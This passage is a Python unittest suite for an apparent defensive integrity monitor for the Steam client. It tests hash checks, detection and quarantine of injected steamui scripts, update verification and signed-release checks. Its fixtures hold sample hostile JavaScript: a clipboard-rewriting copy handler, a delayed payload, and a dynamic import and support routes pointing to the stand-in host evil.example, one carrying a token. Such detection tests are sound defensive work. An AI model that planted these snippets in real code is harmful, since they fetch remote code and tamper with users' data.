        (self.root / 'bin/steamwebhelper.exe').write_bytes(b'modified-helper')
        process = SimpleNamespace(pid=100, create_time=lambda: 1.0, is_running=lambda: True)
        with patch('sentinel.engine.windows.steam_processes', return_value=[process]), patch('sentinel.engine.windows.stop_steam') as stop, patch('sentinel.engine.windows.registry_values', return_value={}):
            engine.guard_once(watch=False)
        stop.assert_called_once()
        self.assertIn('bin/steamwebhelper.exe', engine.commands.get_nowait()[1]['mismatches'])

    def test_clipboard_rewrite_and_delayed_payload_detected(self):
        from sentinel.audit import script_signals
        text='document.addEventListener("copy",function(e){e.preventDefault(); e.clipboardData.setData("text/plain", "");}); let steamhelper="https://evil.example";if(Date.now()>123){setTimeout(open,300)}'
        rules={x[0] for x in script_signals(text)}
        self.assertIn('clipboard-interference',rules)
        self.assertIn('delayed-support-payload',rules)

    def test_timer_alone_not_malicious(self):
        from sentinel.audit import script_signals
        self.assertFalse(script_signals('setTimeout(refresh,3000);const t=Date.now();'))

    def test_new_script_loading_html_detected(self):
        from sentinel.audit import ClientAuditor
        ui=self.root/'steamui';ui.mkdir()
        (ui/'index.html').write_text('<script src="sp.js"></script>')
        (ui/'sp.js').write_text('let x=1')
        ref={**self.ref,'files':{**self.ref['files'],'steamui/index.html':{'sha256':'0'*64}}}
        findings=ClientAuditor(lambda p:(False,'')).audit(self.root,ref).findings
        self.assertTrue(any(f.rule=='unexpected-script-load' and f.action=='restore' for f in findings))

    def test_new_malicious_script_quarantined(self):
        from sentinel.audit import ClientAuditor,RiskRemediator
        ui=self.root/'steamui';ui.mkdir()
        path=ui/'sp.js';path.write_text('SupportMessages:"https://evil.example"')
        findings=ClientAuditor(lambda p:(False,'')).audit(self.root,self.ref).findings
        self.assertTrue(any(f.action=='quarantine-script' for f in findings))
        RiskRemediator(self.root,self.state).apply(findings,lambda:None)
        self.assertFalse(path.exists())

    def test_js_dynamic_external_import_detected(self):
        from sentinel.audit import ClientAuditor
        ui=self.root/'steamui';ui.mkdir()
        (ui/'sp.js').write_text('import("https://evil.example/payload.js");')
        self.assertTrue(any(f.rule=='unexpected-js-import' for f in ClientAuditor(lambda p:(False,'')).audit(self.root,self.ref).findings))

    def test_query_credentials_redacted_in_findings(self):
        from sentinel.audit import script_signals
        signals=script_signals('SupportMessages:"https://evil.example/?token=secret-jwt"')
        self.assertNotIn('secret-jwt',str(signals))

    def test_html_css_events_are_not_filtered(self):
        from sentinel.windows import DirectoryWatcher
        import queue
        watcher=object.__new__(DirectoryWatcher);watcher.events=queue.Queue()
        watcher.add('steamui/index.html');watcher.add('steamui/styles.css')
        self.assertEqual(watcher.drain(),{'steamui/index.html','steamui/styles.css'})

    def test_update_completion_requires_stable_hashes(self):
        from sentinel.updater import CompletionProbe
        probe=CompletionProbe()
        self.assertFalse(probe.check(self.root,self.ref))
        self.assertFalse(probe.check(self.root,self.ref))
        self.assertTrue(probe.check(self.root,self.ref))
        (self.root/'steamclient64.dll').write_bytes(b'bad')
        self.assertFalse(probe.check(self.root,self.ref))

    def test_download_or_window_does_not_mean_update_complete(self):
        from sentinel.updater import CompletionProbe
        probe=CompletionProbe();newref={**self.ref,'version':'200'}
        self.assertFalse(probe.check(self.root,newref))

    def test_completion_requires_fresh_install_receipt(self):
        from sentinel.updater import CompletionProbe
        (self.root/'logs').mkdir();log=self.root/'logs/bootstrap_log.txt'
        log.write_text('installed version 100\nVerification complete\n')
        probe=CompletionProbe(log.stat().st_size)
        for _ in range(3):self.assertFalse(probe.check(self.root,self.ref))
        with log.open('a') as f:f.write('installed version 100\nVerification complete\n')
        self.assertTrue(probe.check(self.root,self.ref))

    def test_old_numbered_chunks_are_info_and_do_not_block_launch(self):
        engine,signals=self.make_engine();self.client.manifest=lambda:self.ref
        ui=self.root/'steamui';ui.mkdir()
        for name in ('1087.js','1316.js','9746.js'):
            (ui/name).write_text('console.log("ordinary old chunk");')
        with patch('sentinel.engine.windows.launch_steam') as launch,patch('sentinel.engine.windows.steam_processes',return_value=[]),patch('sentinel.engine.windows.registry_values',return_value={}):
            engine.launch()
        launch.assert_called_once_with(self.root,force=True)
        self.assertEqual(engine.last_result.state,'clean')
        self.assertEqual(len(engine.last_observations),3)
        self.assertFalse(signals.result.values[-1]['findings'])

    def test_numbered_script_with_malicious_route_still_blocks(self):
        engine,_=self.make_engine();self.client.manifest=lambda:self.ref
        ui=self.root/'steamui';ui.mkdir()
        (ui/'1087.js').write_text('SupportMessages:"https://evil.example"')
        with patch('sentinel.engine.windows.launch_steam') as launch,patch('sentinel.engine.windows.registry_values',return_value={}),self.assertRaises(SafetyError):
            engine.launch()
        launch.assert_not_called()

    def test_clean_already_running_steam_is_not_relaunched(self):
        engine,_=self.make_engine();self.client.manifest=lambda:self.ref
        with patch('sentinel.engine.windows.launch_steam') as launch,patch('sentinel.engine.windows.steam_processes',return_value=[object()]),patch('sentinel.engine.windows.registry_values',return_value={}):
            engine.launch()
        launch.assert_not_called()

    def test_unconfirmed_directory_poll_is_quiet(self):
        engine,signals=self.make_engine();engine.settings['root_confirmed']=False
        with patch('sentinel.engine.windows.steam_processes') as processes:
            engine.poll()
        processes.assert_not_called()
        self.assertFalse(signals.alert.values)

    def test_version_mismatch_stops_then_launches_update_and_confirms(self):
        from sentinel.updater import UpdateController
        engine,_=self.make_engine();newref={**self.ref,'version':'200'}
        engine.references['200']=newref;self.client.manifest=lambda:newref
        order=[]
        def launch(root,force):
            order.append('launch')
            self.assertTrue(force)
            (self.root/'package/steam_client_win64.manifest').write_text('"win64" { "version" "200" }')
            (self.root/'logs').mkdir(exist_ok=True)
            (self.root/'logs/bootstrap_log.txt').write_text('installed version 200\nVerification complete\n')
        with patch('sentinel.windows.stop_steam',side_effect=lambda root:order.append('stop')), patch('sentinel.windows.launch_steam',side_effect=launch), patch('sentinel.windows.registry_values',return_value={}):
            result=UpdateController(engine).run(self.root,newref)
        self.assertEqual(order,['stop','launch'])
        self.assertEqual(result['version'],'200')
        self.assertIsNone(engine.update_state)

    def test_update_timeout_ends_steam_and_does_not_pass(self):
        from sentinel.updater import UpdateController
        engine,_=self.make_engine()
        with patch('sentinel.windows.stop_steam') as stop,patch('sentinel.windows.launch_steam'),self.assertRaises(SafetyError):
            UpdateController(engine).run(self.root,self.ref,timeout=0)
        self.assertEqual(stop.call_count,2)
        self.assertIn(str(self.root),engine.update_failures)

    def test_version_transition_cannot_write_nonbootstrap_files(self):
        with self.assertRaises(SafetyError):
            Repairer(self.root,self.state,self.client,self.ref).repair(['bin/steamwebhelper.exe'],allow_version_transition=True)

    def test_signed_own_release_file_tamper_refused(self):
        from sentinel import selfguard
        key=Ed25519PrivateKey.generate()
        folder=self.base/'own-release';folder.mkdir();(folder/'main.exe').write_bytes(b'good')
        payload={'files':{'main.exe':sha256(folder/'main.exe')}}
        envelope={'payload':payload,'signature':base64.b64encode(key.sign(canonical(payload))).decode()}
        (folder/'release-manifest.json').write_text(json.dumps(envelope),encoding='utf-8')
        public=key.public_key().public_bytes(Encoding.Raw,PublicFormat.Raw).hex()
        with patch.object(selfguard,'PUBLIC_KEY',public):
            self.assertEqual(selfguard.verify_distribution(folder,'',False),1)
            (folder/'main.exe').write_bytes(b'tampered')
            with self.assertRaises(SafetyError):selfguard.verify_distribution(folder,'',False)

    def test_unsigned_extra_own_dll_refused(self):
        from sentinel import selfguard
        key=Ed25519PrivateKey.generate();folder=self.base/'own-release';folder.mkdir()
        (folder/'main.exe').write_bytes(b'good')
        payload={'files':{'main.exe':sha256(folder/'main.exe')}}
        envelope={'payload':payload,'signature':base64.b64encode(key.sign(canonical(payload))).decode()}
        (folder/'release-manifest.json').write_text(json.dumps(envelope),encoding='utf-8')
        (folder/'extra.dll').write_bytes(b'bad')
        public=key.public_key().public_bytes(Encoding.Raw,PublicFormat.Raw).hex()
        with patch.object(selfguard,'PUBLIC_KEY',public),self.assertRaises(SafetyError):selfguard.verify_distribution(folder,'',False)


def run_self_tests():
    suite = unittest.defaultTestLoader.loadTestsFromTestCase(SecurityTests)
    import io
    stream = io.StringIO()
    result = unittest.TextTestRunner(stream=stream, verbosity=2).run(suite)
    return {"successful": result.wasSuccessful(), "tests": result.testsRun,
            "failures": len(result.failures), "errors": len(result.errors),
            "skipped": len(result.skipped), "detail": stream.getvalue()}


if __name__ == "__main__":
    result = run_self_tests()
    print(result["detail"])
    raise SystemExit(0 if result["successful"] else 1)
